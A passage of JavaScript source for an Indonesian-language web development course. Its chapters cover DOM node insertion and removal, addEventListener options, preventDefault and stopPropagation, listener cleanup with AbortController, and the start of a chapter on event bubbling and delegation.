        ['Pesan atau gejala', 'Penyebab sebenarnya', 'Perbaikannya'],
        [
          [
            '`NotFoundError` pada `removeChild`',
            'Node itu bukan anak langsung dari induk yang disebut',
            'Pakai `el.remove()`',
          ],
          [
            '`HierarchyRequestError`',
            'Induk dicoba dimasukkan ke dalam keturunannya',
            'Periksa kedua sisi pemanggilannya',
          ],
          [
            'Elemen hilang dari tempat lamanya',
            'Menambahkan node yang sudah ada berarti memindahkannya',
            'Pakai `cloneNode(true)` kalau memang ingin menyalin',
          ],
          [
            'Pencarian di dalam `template` menghasilkan `null`',
            'Isinya berada di `tpl.content`, bukan di templatenya',
            'Cari lewat `tpl.content.querySelector(...)`',
          ],
          [
            'Penangan peristiwa hilang pada salinan',
            '`cloneNode` tidak menyalin penangan dari `addEventListener`',
            'Pasang ulang, atau pakai delegasi peristiwa di induknya',
          ],
        ],
      ),

      h2('Kesalahan umum pemula'),
      p(
        'Membangun dan menghapus node adalah tempat perbedaan antara kode yang cepat dan kode yang lambat paling terasa, sekaligus tempat kebocoran memori paling sering lahir.',
      ),
      table(
        ['Yang sering dilakukan', 'Kenapa terasa benar', 'Yang sebenarnya terjadi'],
        [
          [
            'Membangun daftar dengan `innerHTML +=` di dalam loop',
            'Paling pendek dan langsung terlihat',
            'Seluruh isi wadah dibongkar dan dibangun ulang tiap putaran, sehingga fokus hilang, penangan peristiwa hilang, dan data pengguna yang sedang diketik ikut lenyap',
          ],
          [
            'Menyalin elemen dengan `cloneNode` lalu heran tombolnya mati',
            'Salinannya kan sama persis',
            '`cloneNode` menyalin struktur dan atribut, bukan penangan dari `addEventListener`. Pakai delegasi peristiwa di induk yang stabil',
          ],
          [
            'Menghapus elemen tanpa melepas penangan dan timer di dalamnya',
            'Elemennya sudah hilang dari layar',
            'Timer dan penangan yang masih memegang rujukan ke elemen itu menahannya di memori. Di aplikasi satu halaman, ini menumpuk sampai tab menjadi berat',
          ],
          [
            'Menyusun HTML sebagai teks lalu memasangnya dengan `innerHTML`',
            'Lebih cepat ditulis daripada membuat node satu per satu',
            'Setiap nilai yang disisipkan harus diperiksa asalnya. Pakai `template` supaya strukturnya tetap di HTML dan hanya isinya yang diisi',
          ],
          [
            'Membuat elemen di dalam loop lalu langsung memasangnya, khawatir soal kecepatan',
            'Katanya menambah node satu per satu itu lambat',
            'Pada peramban modern itu sudah cepat, yaitu sekitar satu milidetik untuk dua ribu node. Yang mahal adalah membaca tata letak di antaranya, bukan menambahnya',
          ],
          [
            'Memakai `insertAdjacentHTML` untuk data pengguna',
            'Namanya berbeda dari `innerHTML`, jadi terasa lebih aman',
            'Ia mengurai HTML dengan cara yang sama, jadi risikonya identik. Yang berbeda hanya posisinya, bukan keamanannya',
          ],
        ],
      ),
      p(
        'Baris kelima layak diluruskan karena nasihat menghindari penambahan satu per satu sudah beredar sangat lama dan sebagian sudah tidak berlaku. Pengukuran di Chromium sungguhan menunjukkan dua ribu `appendChild` berurutan memakan sekitar satu milidetik, dan versi `DocumentFragment` justru dua milidetik. Alasan memakai fragment tetap ada, yaitu maksudnya lebih jelas dan ia menghindari keadaan setengah jadi yang sempat terlihat, tapi kecepatan bukan lagi alasannya.',
      ),
      callout(
        'info',
        'Elemen yang dihapus tidak langsung hilang dari memori',
        'Selama masih ada variabel, penangan peristiwa, atau timer yang memegang rujukan ke sebuah elemen, elemen itu tetap tinggal di memori meski sudah dilepas dari halaman. Ini disebut node terlepas, dan tab Memory di DevTools bisa menghitungnya. Cara paling andal menghindarinya adalah melepas seluruh penangan lewat satu `AbortController`, seperti dibahas di Bab 3.',
      ),
      divider,
      h2('Rangkuman'),
      ul(
        '`append`, `prepend`, `before`, `after`, `remove` — API modern, menerima beberapa argumen.',
        'Menyisipkan elemen yang sudah ada akan memindahkannya, bukan menyalin.',
        'Rakit di `DocumentFragment` lalu sisipkan sekali untuk daftar besar.',
        '`replaceChildren()` mengosongkan wadah tanpa `innerHTML = ""`.',
        'Selalu tangani empty state secara eksplisit.',
      ),
      references(
        {
          label: 'Document.createElement()',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/Document/createElement',
          source: 'MDN',
          note: 'Jalur aman membangun elemen dari kode, tanpa merangkai HTML dari teks.',
        },
        {
          label: 'Element.append()',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/Element/append',
          source: 'MDN',
          note: 'Bedanya dengan `appendChild` lama: menerima beberapa node sekaligus dan juga teks biasa.',
        },
        {
          label: 'DocumentFragment',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/DocumentFragment',
          source: 'MDN',
          note: 'Wadah sementara yang membuat penyisipan daftar besar hanya memicu satu kali perhitungan ulang.',
        },
        {
          label: 'Element.replaceChildren()',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/Element/replaceChildren',
          source: 'MDN',
          note: 'Cara mengosongkan wadah tanpa `innerHTML = ""` yang memicu parsing HTML.',
        },
        {
          label: 'The template element',
          href: 'https://developer.mozilla.org/en-US/docs/Web/HTML/Element/template',
          source: 'MDN',
          note: 'Cetakan yang diurai tapi tidak digambar — pola paling rapi untuk daftar berulang.',
        },
      ),
    ],
  ),

  written(
    'event-dasar',
    'Event: `addEventListener` & objek Event',
    24,
    'Bereaksi terhadap tindakan pengguna — dan membersihkannya kembali.',
    [
      terms(
        {
          term: 'event',
          meaning:
            'Terjemahannya **peristiwa**. Sesuatu yang terjadi pada halaman dan bisa kamu tanggapi: klik, ketikan, gulir, pengiriman form, gambar selesai dimuat. Browser mengirimkan objek berisi keterangan lengkap tentang peristiwa itu ke fungsi yang kamu daftarkan.',
        },
        {
          term: 'addEventListener',
          meaning:
            'Gabungan *add* (menambah), *event*, dan *listener* (pendengar). Method untuk **mendaftarkan fungsi yang akan dipanggil** setiap kali peristiwa tertentu terjadi. Keunggulannya atas cara lama `el.onclick = ...`: kamu bisa memasang **banyak** pendengar untuk peristiwa yang sama tanpa saling menimpa.',
        },
        {
          term: 'listener',
          meaning:
            'Terjemahannya **pendengar**. Fungsi yang kamu daftarkan untuk menanggapi sebuah peristiwa. Istilah *handler* (penangan) juga sering dipakai dengan arti yang sama.',
        },
        {
          term: 'removeEventListener',
          meaning:
            'Melepas pendengar yang sudah terdaftar. Syaratnya ketat dan sering menjebak: ia butuh **referensi fungsi yang sama persis**. Karena itu pendengar yang didaftarkan sebagai fungsi anonim `() => {}` **tidak akan pernah bisa dilepas** — setiap penulisan menghasilkan fungsi baru.',
        },
        {
          term: 'e / event',
          meaning:
            'Nama parameter yang lazim untuk objek peristiwa: `(e) => ...` atau `(event) => ...`. Keduanya sama saja — kebiasaan penamaan, bukan aturan.',
        },
        {
          term: 'e.target',
          meaning:
            'Elemen yang **benar-benar memicu** peristiwa — tempat kliknya mendarat. Bedakan baik-baik dari `e.currentTarget`, yaitu elemen tempat pendengarnya **dipasang**. Pada klik biasa keduanya sering sama, tapi pada event delegation di sub-bab berikutnya keduanya hampir selalu berbeda, dan di situlah letak seluruh kegunaannya.',
        },
        {
          term: 'preventDefault',
          meaning:
            'Membatalkan **perilaku bawaan browser** untuk peristiwa itu — form yang berpindah halaman saat dikirim, tautan yang membuka alamat, checkbox yang berubah tercentang. Perlu diingat, ia hanya membatalkan aksi bawaan; ia **tidak** menghentikan peristiwanya menjalar ke elemen induk.',
        },
        {
          term: 'once',
          meaning:
            'Opsi `{ once: true }` yang membuat pendengar **otomatis melepas dirinya** setelah berjalan satu kali. Menghemat pekerjaan pembersihan untuk hal-hal seperti tombol yang hanya boleh diklik sekali.',
        },
        {
          term: 'passive',
          meaning:
            'Opsi `{ passive: true }` yang menjadi **janji kepada browser** bahwa pendengar ini tidak akan memanggil `preventDefault`. Berkat janji itu, browser boleh langsung menggulir tanpa menunggu kodemu selesai — dan gulirannya terasa jauh lebih lancar.',
        },
        {
          term: 'memory leak',
          meaning:
            'Terjemahannya **kebocoran memori**. Pendengar yang tidak pernah dilepas menahan elemennya tetap hidup di memori meski sudah dihapus dari halaman. Pada aplikasi yang berjalan lama, kebocoran seperti ini menumpuk sampai terasa berat.',
        },
      ),

      h2('Dasar'),
      code(
        'js',
        `
        function tangani(event) {
          console.log(event.type);   // 'click'
        }

        tombol.addEventListener('click', tangani);
        tombol.removeEventListener('click', tangani);   // butuh referensi fungsi YANG SAMA
        `,
      ),
      p(
        'Perhatikan `tangani` dioper **tanpa kurung** di kedua baris, karena kamu menyerahkan fungsinya dan bukan memanggilnya sekarang. Menambahkan kurung akan menjalankannya seketika dan mendaftarkan return value-nya sebagai listener. Fungsi itu nanti dipanggil browser dengan satu argumen, objek `event`, yang membawa seluruh keterangan tentang apa yang terjadi. Bagian yang paling menentukan ada di baris kedua, karena `removeEventListener` mencocokkan **berdasarkan alamat fungsi**, bukan namanya maupun isinya. Karena itu fungsinya harus disimpan di suatu variabel supaya alamat yang sama bisa disebut dua kali, dan karena itu pula fungsi anonim, seperti diperingatkan di bawah, mustahil dilepas.',
      ),
      callout(
        'warning',
        'Fungsi anonim tidak bisa dilepas',
        '`addEventListener("click", () => {})` membuat fungsi baru setiap dipanggil, jadi `removeEventListener` tidak akan pernah menemukan pasangannya. Simpan referensinya, atau pakai `AbortController`.',
      ),
      code(
        'js',
        `
        // Cara modern melepas banyak listener sekaligus
        const controller = new AbortController();

        tombol.addEventListener('click', a, { signal: controller.signal });
        input.addEventListener('input', b, { signal: controller.signal });
        window.addEventListener('resize', c, { signal: controller.signal });

        controller.abort();   // ketiganya lepas sekaligus
        `,
      ),
      p(
        'Ini `AbortController` yang sama persis dengan yang membatalkan `fetch` di Bab 3, dan pemakaian ulangnya di sini disengaja oleh perancang bahasa. Satu `signal` dibagikan ke tiga listener yang berbeda, terpasang pada tiga elemen yang berbeda, lalu `controller.abort()` melepas ketiganya sekaligus. Keuntungannya bukan sekadar hemat baris, karena kamu **tidak perlu lagi menyimpan referensi tiap fungsi** hanya supaya bisa melepasnya nanti, sehingga fungsi anonim yang tadi mustahil dilepas kini boleh dipakai dengan aman. Pola ini menyelesaikan masalah pembersihan yang berantakan pada aplikasi satu halaman. Kumpulkan semua listener sebuah tampilan di bawah satu controller, lalu batalkan sekali saat tampilan itu ditinggalkan.',
      ),

      h2('Objek Event'),
      code(
        'js',
        `
        wadah.addEventListener('click', (e) => {
          e.type;             // 'click'
          e.target;           // elemen yang BENAR-BENAR diklik (bisa anak terdalam)
          e.currentTarget;    // elemen tempat listener terpasang — di sini: wadah
          e.timeStamp;

          // Khusus mouse
          e.clientX; e.clientY;      // relatif viewport
          e.button;                  // 0 kiri, 1 tengah, 2 kanan

          // Khusus keyboard
          e.key;                     // 'Enter', 'a', 'Escape'
          e.ctrlKey; e.metaKey; e.shiftKey;
        });
        `,
      ),
      p(
        "Objek `event` adalah satu-satunya sumber keterangan tentang apa yang barusan terjadi, dan isinya **berbeda-beda menurut jenis peristiwanya**. Itulah kenapa contoh di atas dikelompokkan. Peristiwa mouse membawa koordinat dan tombol mana yang ditekan, sedangkan peristiwa keyboard membawa `e.key` berisi nama tombolnya sebagai teks (`'Enter'`, `'Escape'`) beserta status tombol pengubah. Dua property teratas berlaku untuk semua jenis dan paling sering tertukar. `e.currentTarget` **selalu** elemen tempat listener dipasang, yang di sini berarti `wadah`, sedangkan `e.target` adalah elemen terdalam yang benar-benar disentuh pengguna, yang bisa jadi cucu atau cicit dari wadah itu. Perbedaan itu bukan kerumitan yang mengganggu, karena justru dari situlah teknik event delegation di sub-bab berikutnya mendapat kekuatannya.",
      ),
      callout(
        'danger',
        '`target` vs `currentTarget` — sumber bug yang sering',
        'Klik pada `<button><span>Hapus</span></button>` membuat `e.target` bernilai `<span>`, bukan tombolnya. Untuk mendapatkan elemen yang kamu maksud, pakai `e.target.closest("button")`.',
      ),

      h2('`preventDefault` dan `stopPropagation`'),
      code(
        'js',
        `
        form.addEventListener('submit', (e) => {
          e.preventDefault();       // batalkan perilaku bawaan (reload halaman)
          kirimLewatFetch();
        });

        link.addEventListener('click', (e) => {
          e.preventDefault();       // jangan pindah halaman
        });

        // stopPropagation menghentikan event naik ke induk.
        // Pakai HEMAT: ia sering memutus listener global orang lain
        // (menutup dropdown saat klik di luar, misalnya).
        e.stopPropagation();
        `,
      ),
      p(
        'Keduanya sering dikira sepasang, padahal mengatur dua hal yang sama sekali berbeda. `preventDefault` membatalkan **perilaku bawaan browser**, yang pada `submit` berarti memuat ulang halaman dan pada klik tautan berarti berpindah alamat. Ia tidak menghentikan perjalanan event ke mana pun, sehingga listener lain tetap menerimanya. `stopPropagation` sebaliknya tidak menyentuh perilaku bawaan sama sekali, karena yang ia hentikan adalah **perjalanan event naik ke elemen induk**. Peringatan di komentar layak dianggap serius. Banyak fungsi bekerja dengan mendengarkan klik di `document`, misalnya menutup dropdown saat klik di luar, menutup modal, dan mencatat analitik. Satu `stopPropagation` di elemen dalam membuat semuanya diam tanpa pesan error apa pun. Ketika dropdown "tidak mau menutup" tanpa sebab yang jelas, `stopPropagation` di suatu tempat adalah tersangka pertama.',
      ),

      h2('Opsi listener'),
      table(
        ['Opsi', 'Gunanya'],
        [
          ['`once: true`', 'Otomatis lepas setelah dipanggil sekali'],
          [
            '`passive: true`',
            'Berjanji tidak memanggil `preventDefault` — membuat scroll tetap mulus',
          ],
          ['`capture: true`', 'Tangkap saat turun, bukan saat naik'],
          ['`signal`', 'Lepas lewat `AbortController`'],
        ],
      ),
      code(
        'js',
        `
        // Untuk listener scroll dan touch, passive hampir selalu benar
        window.addEventListener('scroll', tangani, { passive: true });

        dialog.addEventListener('close', bersihkan, { once: true });
        `,
      ),
      p(
        '`{ passive: true }` layak dipahami sebagai **janji**, bukan pengaturan performa yang samar. Tanpa janji itu, setiap kali pengguna menggulir, browser harus menjalankan kodemu lebih dulu dan menunggu sampai selesai, sebab kamu mungkin memanggil `preventDefault` untuk membatalkan gulirannya. Menunggu itulah yang membuat scroll terasa tersendat pada halaman berat. Dengan `passive: true`, kamu berjanji tidak akan membatalkannya, sehingga browser boleh langsung menggulir tanpa menunggu. Konsekuensinya harus dipatuhi, karena memanggil `preventDefault` di dalam listener passive akan diabaikan dan menghasilkan peringatan di console. `{ once: true }` menyelesaikan hal yang berbeda, yaitu listener melepas dirinya sendiri setelah berjalan sekali, sehingga tidak ada yang perlu dibersihkan belakangan.',
      ),

      h2('Membersihkan listener'),
      code(
        'js',
        `
        // Listener pada window/document TIDAK hilang saat elemenmu dihapus.
        // Kalau tidak dilepas, ia terus berjalan dan menahan objek di memori —
        // ini kebocoran memori yang paling umum di aplikasi satu halaman.
        `,
      ),
      p(
        'Ini beda mendasar dari listener yang dipasang di sebuah elemen. Elemen yang dihapus dari DOM otomatis melepas listener yang menempel padanya, tapi `window` dan `document` tidak pernah "dihapus", karena keduanya selalu ada selama halaman terbuka. Di aplikasi satu halaman yang berganti "tampilan" tanpa memuat ulang browser, listener yang dipasang di `window` saat menampilkan satu tampilan akan terus menumpuk setiap kali tampilan itu muncul lagi, kalau tidak pernah dilepas. React menyelesaikan ini lewat fungsi pembersihan `useEffect` yang sudah disinggung di sub-bab `AbortController` pada Bab 3.',
      ),

      divider,
      h2('Studi kasus di project nyata'),
      p(
        'Formulir langganan buletin punya satu kotak email dan satu tombol kirim. Kamu memasang penangan klik pada tombolnya, memanggil server, lalu menampilkan pesan berhasil. Tiga laporan masuk berurutan. Halaman berkedip lalu pesannya hilang. Pengguna yang menekan Enter di kotak email tidak mendapat apa-apa. Dan sebagian pengguna berhasil mendaftar dua kali.',
      ),
      p(
        'Ketiganya berasal dari pilihan peristiwa yang salah. Yang dipasang penangan seharusnya bukan tombolnya melainkan formulirnya, dan peristiwanya bukan `click` melainkan `submit`.',
      ),
      code(
        'js',
        `
        // Versi yang menimbulkan ketiga masalah.
        tombol.addEventListener('click', async () => {
          const email = kotak.value;
          await daftar(email);
          tampilkanBerhasil();
        });
        `,
        { filename: 'Sebelum' },
      ),
      p(
        'Halaman berkedip karena tombol di dalam `form` bertipe `submit` secara bawaan, sehingga peramban mengirim formulir dan memuat ulang halaman. Pesan berhasil sempat muncul lalu hilang bersama halamannya. Pengguna yang menekan Enter tidak mendapat apa-apa karena Enter memicu `submit` pada formulir, bukan `click` pada tombol. Dan pendaftaran ganda terjadi karena tidak ada yang mencegah klik kedua selama permintaan pertama berjalan.',
      ),
      code(
        'js',
        `
        const form = document.getElementById('form-buletin');
        const kotak = form.elements.email;
        const tombol = form.elements.kirim;

        form.addEventListener('submit', async (peristiwa) => {
          peristiwa.preventDefault();          // hentikan pengiriman bawaan peramban

          if (tombol.disabled) return;         // penjaga kedua, kalau-kalau lolos
          tombol.disabled = true;
          form.setAttribute('aria-busy', 'true');

          try {
            await daftar(kotak.value);
            tampilkanBerhasil();
            form.reset();
          } catch (galat) {
            tampilkanGagal(galat.message);
          } finally {
            tombol.disabled = false;
            form.removeAttribute('aria-busy');
          }
        });
        `,
        { filename: 'src/buletin.js' },
      ),
      p(
        'Memasang penangan pada `submit` menyelesaikan dua masalah sekaligus tanpa kode tambahan. Peristiwa `submit` dipicu oleh klik tombol **maupun** oleh Enter di dalam kolom teks, sehingga kedua cara pengguna berinteraksi ikut tertangani. Ini juga sesuai dengan aturan frontend project ini yang menganjurkan elemen bawaan, sebab perilaku keyboard dan bantuan teknologi asistif sudah tersedia tanpa dibangun ulang.',
      ),
      p(
        '`peristiwa.preventDefault()` membatalkan perilaku bawaan peramban, yaitu mengirim formulir ke alamat di atribut `action` lalu memuat halaman baru. Perhatikan ia dipanggil di **baris pertama**, bukan setelah `await`. Kalau ia dipanggil setelah `await`, peramban sudah terlanjur memulai pengirimannya, sebab peluang membatalkan hanya ada selama penangan berjalan secara sinkron.',
      ),
      p(
        'Blok `finally` mengembalikan tombol ke keadaan aktif apa pun hasilnya. Tanpa itu, satu kegagalan meninggalkan tombol mati selamanya dan pengguna harus memuat ulang halaman. Ini pola yang sama dengan yang dibahas di Bab 3, dan ia berlaku untuk setiap tombol yang dimatikan selama menunggu.',
      ),
      code(
        'js',
        `
        // Tiga opsi addEventListener yang paling sering berguna.
        el.addEventListener('click', tangani, { once: true });    // lepas setelah sekali jalan
        el.addEventListener('scroll', tangani, { passive: true }); // janji tidak preventDefault
        el.addEventListener('click', tangani, { signal });         // lepas lewat AbortController
        `,
        { caption: 'Argumen ketiga menerima object opsi, bukan hanya boolean.' },
      ),
      p(
        'Opsi `once` menggantikan pola melepas penangan dari dalam dirinya sendiri, dan itu berguna untuk hal seperti tombol Mulai yang hanya boleh sekali. Opsi `passive` berlaku untuk peristiwa gulir dan sentuhan, dan ia memberi tahu peramban bahwa penangan ini tidak akan membatalkan gulirannya, sehingga peramban boleh menggulir tanpa menunggu penanganmu selesai. Tanpa itu, gulir bisa terasa tersendat pada perangkat sentuh.',
      ),
      callout(
        'tip',
        'Nilai kembalian `addEventListener` tidak ada, jadi simpan rujukan fungsinya',
        'Untuk melepas penangan nanti, kamu perlu memberikan fungsi yang **sama persis** ke `removeEventListener`. Fungsi panah yang ditulis langsung di pemanggilan tidak bisa dilepas, sebab kamu tidak memegang rujukannya. Cara paling mudah menghindari seluruh masalah ini adalah memakai opsi `signal` dari `AbortController`, seperti dibahas di Bab 3.',
      ),

      h2('Saat error-nya muncul'),
      p(
        'Kegagalan peristiwa jarang berupa pesan error, dan lebih sering berupa penangan yang tidak jalan atau jalan terlalu sering.',
      ),
      code(
        'text',
        `
        tombol.addEventListener('click', tangani());
                                                ^^

        // Tidak ada error. Fungsi 'tangani' berjalan SEKARANG,
        // dan hasilnya yang dipasang sebagai penangan.
        `,
        { caption: 'Tanda kurung ikut ditulis, sehingga fungsinya dipanggil terlalu awal.' },
      ),
      p(
        'Ini kesalahan satu karakter yang menghasilkan dua gejala sekaligus. Isi `tangani` berjalan satu kali saat halaman dimuat, dan sesudahnya kliknya tidak melakukan apa-apa karena yang terpasang adalah nilai kembaliannya yang biasanya `undefined`. Kalau kamu perlu memberikan argumen, bungkus dengan fungsi panah menjadi `() => tangani(id)`, bukan menulis `tangani(id)` langsung.',
      ),
      code(
        'text',
        `
        form.addEventListener('submit', async (e) => {
          await periksa();
          e.preventDefault();      // terlambat
        });

        // Halaman tetap memuat ulang.
        `,
        { caption: '`preventDefault` dipanggil setelah `await`.' },
      ),
      p(
        'Peluang membatalkan perilaku bawaan hanya ada selama penangan berjalan secara sinkron. Begitu `await` menyerahkan giliran, peramban menyimpulkan penanganmu selesai dan melanjutkan pengiriman formulir. Tidak ada error dan tidak ada peringatan. Panggil `preventDefault` sebagai baris pertama, lalu kerjakan sisanya.',
      ),
      code(
        'text',
        `
        // Fungsi pemasang dipanggil dua kali karena komponen digambar ulang.
        pasang();
        pasang();

        // Satu klik menghasilkan dua pemanggilan, dan pesanan terkirim dua kali.
        `,
        { caption: 'Penangan yang sama terpasang berkali-kali.' },
      ),
      p(
        '`addEventListener` menumpuk, jadi memanggilnya dua kali dengan fungsi yang berbeda rujukannya akan memasang dua penangan. Gejalanya khas, yaitu satu klik menghasilkan dua kali efek, lalu tiga, lalu empat setelah beberapa kali navigasi. Ada tiga jalan keluarnya, yaitu memakai opsi `once`, melepas penangan lama sebelum memasang yang baru, atau memakai delegasi di induk yang tidak pernah digambar ulang.',
      ),
      code(
        'text',
        `
        tombol.removeEventListener('click', () => tangani());

        // Tidak ada error, dan tidak ada yang terlepas.
        `,
        { caption: 'Fungsi yang diberikan bukan rujukan yang sama dengan yang dipasang.' },
      ),
      p(
        '`removeEventListener` membandingkan rujukan fungsi, bukan isinya. Fungsi panah yang baru saja kamu tulis adalah object yang berbeda dari yang dipasang dulu, walaupun isinya identik. Karena ia tidak melempar apa pun, kesalahan ini sangat mudah lolos dan gejalanya berupa penangan yang menumpuk seperti pada kasus di atas.',
      ),
      table(
        ['Gejala', 'Penyebab sebenarnya', 'Perbaikannya'],
        [
          [
            'Penangan berjalan sekali saat halaman dimuat lalu tidak pernah lagi',
            'Tanda kurung ikut ditulis saat memasang',
            'Berikan nama fungsinya tanpa kurung, atau bungkus dengan fungsi panah',
          ],
          [
            'Halaman tetap memuat ulang saat formulir dikirim',
            '`preventDefault` dipanggil setelah `await`',
            'Panggil sebagai baris pertama penangan',
          ],
          [
            'Satu klik menghasilkan efek berkali-kali',
            'Penangan terpasang berulang',
            'Pakai `once`, lepas yang lama, atau pakai delegasi di induk',
          ],
          [
            '`removeEventListener` tidak melepas apa pun',
            'Rujukan fungsinya berbeda',
            'Simpan rujukannya, atau pakai opsi `signal` dari `AbortController`',
          ],
          [
            'Enter di kotak teks tidak melakukan apa-apa',
            'Penangan dipasang pada `click` tombol, bukan `submit` formulir',
            'Pindahkan ke peristiwa `submit` pada elemen `form`',
          ],
        ],
      ),

      h2('Kesalahan umum pemula'),
      p(
        'Peristiwa adalah tempat pertama kode frontend bertemu dengan pengguna sungguhan, dan sebagian besar kesalahan di bawah baru terlihat setelah ada orang lain yang memakainya.',
      ),
      table(
        ['Yang sering dilakukan', 'Kenapa terasa benar', 'Yang sebenarnya terjadi'],
        [
          [
            'Memasang penangan pada tombol, bukan pada formulirnya',
            'Yang diklik memang tombolnya',
            'Pengguna yang menekan Enter di kotak teks terlewat sepenuhnya, dan itu cara yang sangat umum mengirim formulir',
          ],
          [
            'Memakai atribut `onclick` di HTML',
            'Paling cepat ditulis',
            'Hanya bisa satu penangan per elemen, sulit dilepas, dan bentrok dengan aturan keamanan konten yang melarang skrip inline',
          ],
          [
            'Memakai `event.preventDefault()` untuk semua peristiwa berjaga-jaga',
            'Supaya tidak ada perilaku aneh',
            'Ia mematikan perilaku bawaan yang mungkin justru dibutuhkan, misalnya menyalin teks atau membuka tautan di tab baru',
          ],
          [
            'Memakai `event.stopPropagation()` untuk memperbaiki penangan yang bentrok',
            'Setelah itu masalahnya hilang',
            'Ia mematikan penangan lain yang sah, termasuk yang menutup menu saat mengklik di luar. Perbaiki syaratnya, jangan hentikan alirannya',
          ],
          [
            'Memakai `keypress` untuk menangkap tombol keyboard',
            'Namanya paling langsung',
            '`keypress` sudah usang dan tidak menangkap seluruh tombol. Pakai `keydown`, dan periksa lewat `event.key` bukan `event.keyCode`',
          ],
          [
            'Menambahkan penangan `mousedown` sebagai pengganti `click`',
            'Ia terasa lebih responsif',
            '`click` juga dipicu keyboard lewat Enter dan spasi pada tombol, sedangkan `mousedown` tidak. Pengguna keyboard kehilangan seluruh fungsinya',
          ],
        ],
      ),
      p(
        'Baris terakhir adalah kesalahan aksesibilitas yang paling sering tanpa disadari. Peristiwa `click` pada elemen `button` bukan hanya tentang tetikus, sebab peramban juga memicunya saat pengguna menekan Enter atau spasi pada tombol yang sedang mendapat fokus. Mengganti `click` dengan `mousedown` atau memasang penangan pada `div` alih-alih `button` sama-sama memutus jalur itu, dan pengguna yang tidak memakai tetikus tidak punya cara memakai fiturmu.',
      ),
      callout(
        'warning',
        'Penangan yang menumpuk adalah penyebab pengiriman ganda yang paling sering',
        'Kalau sebuah fungsi pemasang penangan bisa dipanggil lebih dari sekali, cepat atau lambat ia akan dipanggil lebih dari sekali. Anggap itu pasti terjadi, lalu pilih salah satu dari tiga jalan keluarnya sejak awal. Yang paling tahan adalah delegasi di induk yang stabil, dan itu topik sub-bab berikutnya.',
      ),
      divider,
      h2('Rangkuman'),
      ul(
        'Fungsi anonim tidak bisa dilepas; simpan referensinya atau pakai `signal`.',
        '`e.target` adalah yang diklik; `e.currentTarget` adalah tempat listener dipasang.',
        '`e.target.closest("button")` mendapatkan elemen yang kamu maksud.',
        '`{ passive: true }` untuk scroll dan touch; `{ once: true }` untuk sekali pakai.',
        'Listener pada `window`/`document` wajib dilepas — kalau tidak, memori bocor.',
      ),
      references(
        {
          label: 'EventTarget.addEventListener()',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/EventTarget/addEventListener',
          source: 'MDN',
          note: 'Seluruh opsi `once`, `passive`, `capture`, dan `signal` yang dipakai di sub-bab ini.',
        },
        {
          label: 'Event',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/Event',
          source: 'MDN',
          note: 'Property objek peristiwa, termasuk perbedaan `target` dan `currentTarget`.',
        },
        {
          label: 'Event.preventDefault()',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/Event/preventDefault',
          source: 'MDN',
          note: 'Menegaskan bahwa ia membatalkan aksi bawaan, bukan menghentikan penjalaran peristiwa.',
        },
        {
          label: 'Improving scrolling performance with passive listeners',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/EventTarget/addEventListener#improving_scrolling_performance_with_passive_listeners',
          source: 'MDN',
          note: 'Alasan `{ passive: true }` membuat guliran terasa jauh lebih lancar.',
        },
        {
          label: 'AbortSignal',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/AbortSignal',
          source: 'MDN',
          note: 'Cara modern melepas banyak pendengar sekaligus — pola yang sama dengan Sub-bab 3.8.',
        },
      ),
    ],
  ),

  written(
    'bubbling-delegation',
    'Bubbling, Capturing & Event Delegation',
    24,
    'Satu listener untuk seratus elemen — termasuk yang belum ada.',
    [
      terms(
        {
          term: 'bubbling',
          meaning:
            'Terjemahannya **menggelembung**. Perjalanan peristiwa **naik** dari elemen yang diklik menuju induknya, terus ke atas sampai `document`. Nama itu menggambarkan gelembung yang naik ke permukaan air. Ini fase **bawaan** tempat pendengarmu berjalan kalau kamu tidak mengaturnya — dan sifat inilah yang membuat event delegation mungkin.',
        },
        {
          term: 'capturing',
          meaning:
            'Terjemahannya **penangkapan**. Fase kebalikan: peristiwa **turun** dari `document` menuju elemen yang diklik, sebelum bubbling dimulai. Untuk mendengarkan di fase ini kamu harus memintanya secara khusus dengan `{ capture: true }`. Jarang dibutuhkan, tapi berguna untuk mencegat peristiwa sebelum sampai ke tujuannya.',
        },
        {
          term: 'target phase',
          meaning:
            'Fase di tengah, saat peristiwa **tiba tepat di elemen** yang memicunya. Urutan lengkapnya karena itu: turun (capturing) → tiba (target) → naik (bubbling).',
        },
        {
          term: 'event delegation',
          meaning:
            'Terjemahannya **pendelegasian peristiwa**. Memasang **satu** pendengar di elemen induk untuk menangani peristiwa dari **semua** anaknya, alih-alih satu pendengar per anak. Dua keuntungannya besar: seratus baris cukup satu pendengar, dan **baris yang ditambahkan nanti langsung ikut bekerja** tanpa perlu didaftarkan ulang.',
        },
        {
          term: 'closest',
          meaning:
            'Method yang menelusuri **ke atas** dari sebuah elemen, dimulai dari dirinya sendiri lalu induknya dan terus naik, mencari yang cocok dengan selector. Inilah pasangan wajib event delegation, karena klik bisa mendarat di ikon di dalam tombol, dan `e.target.closest("button")` memastikan kamu tetap mendapat tombolnya.',
        },
        {
          term: 'stopPropagation',
          meaning:
            'Menghentikan peristiwa agar **tidak menjalar lebih jauh** ke elemen berikutnya. Pakailah dengan sangat hemat, karena ia membuat pendengar di tingkat atas, termasuk milik library lain, diam-diam berhenti bekerja, dan penyebabnya sangat sulit dilacak dari tempat kejadian.',
        },
        {
          term: 'stopImmediatePropagation',
          meaning:
            'Lebih keras lagi: selain menghentikan penjalaran, ia juga membatalkan **pendengar lain pada elemen yang sama** yang belum sempat berjalan. Nyaris selalu berlebihan, dan hampir selalu ada cara yang lebih baik.',
        },
        {
          term: 'event.target vs currentTarget',
          meaning:
            'Pada event delegation keduanya **hampir selalu berbeda**, dan di situlah letak seluruh polanya. `target` adalah elemen yang benar-benar diklik (misalnya sebuah tombol di dalam baris), sementara `currentTarget` adalah wadah tempat pendengarnya dipasang.',
        },
        {
          term: 'event yang tidak menggelembung',
          meaning:
            'Sebagian peristiwa **tidak** naik ke induknya — `focus`, `blur`, `load`, dan `mouseenter` termasuk di dalamnya. Untuk kasus fokus, pakai padanannya yang menggelembung: `focusin` dan `focusout`.',
        },
      ),

      h2('Tiga fase perjalanan event'),
      code(
        'text',
        `
